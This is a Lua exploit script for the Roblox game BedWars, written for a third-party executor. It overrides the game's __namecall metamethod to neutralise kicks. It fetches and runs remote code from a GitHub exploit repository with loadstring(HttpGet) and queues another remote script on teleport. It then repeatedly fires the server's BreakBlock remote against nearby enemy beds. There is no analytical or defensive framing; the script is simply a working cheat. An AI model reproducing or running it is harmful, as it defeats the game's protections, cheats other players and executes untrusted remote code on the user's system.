wait(5)
local debounce = "hello"
local mt = getrawmetatable(game)
local old = mt.__namecall
local protect = newcclosure or protect_function

setreadonly(mt, false)
mt.__namecall = protect(function(self, ...)
	local method = getnamecallmethod()
	if method == "Kick" then
		wait(9e9)
		return
	end
	return old(self, ...)
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/DiamondHands-Exploit/BedWarsExploit/main/Source.lua"))()
syn.queue_on_teleport("https://raw.githubusercontent.com/xkid-discord/scripts/main/queuebedwars.lua")

 game.StarterGui:SetCore("SendNotification", {
        Title = "Loaded!",
        Text = "Sucessfully loaded lego haxx!"
})

while wait() do
   pcall(function()
       for i,v in pairs(game:GetService("Workspace").Map.Blocks:GetChildren()) do
           if v.Name == "bed" and v.Covers.BrickColor ~= game.Players.LocalPlayer.TeamColor and game.Players.LocalPlayer:DistanceFromCharacter(v.Position) < 150 then
               spawn(function()
                   game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.BreakBlock:InvokeServer({
                       ["blockRef"] = {
                           ["blockPosition"] = v.Position/3--.new(186, 14, 108)
                       },
                       ["hitPosition"] = v.Position,
                       ["hitNormal"] = Vector3.new(1, 0, 0)
                   })
               end)
           end
       end
   end)
end

